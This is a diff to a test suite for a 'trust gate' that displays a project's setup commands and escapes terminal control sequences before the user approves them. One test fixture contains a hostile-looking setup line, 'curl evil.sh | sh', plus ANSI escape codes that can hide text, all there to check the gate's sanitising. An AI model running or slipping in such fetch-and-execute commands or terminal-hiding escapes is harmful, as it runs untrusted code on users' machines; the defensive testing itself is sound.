@@ -314,7 +314,7 @@ describe("what the gate shows", () => {
     const io = fakeIO({ tty: true, answer: "n" });
     await trustGate(ctx, project, state, { io });
     expect(io.out).toMatch(/setup\.run\s+curl evil\.sh \| sh\\r npm ci/);
-    expect(io.out).toContain("pnpm dev\\u001b[1A\\u001b[2K");
+    expect(io.out).toContain(String.raw`pnpm dev\u001b[1A\u001b[2K`);
     expect(io.out).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/);
   });
 
@@ -332,7 +332,7 @@ describe("what the gate shows", () => {
     await pushAndFetch({ ".testlane.toml": V1 + `# \u009b2K\n` });
     const io = fakeIO({ tty: true, answer: "n" });
     await trustGate(ctx, project, state, { io });
-    expect(io.out).toContain("+# \\u009b2K");
+    expect(io.out).toContain(String.raw`+# \u009b2K`);
     expect(io.out).not.toContain("\u009b");
   });
 });
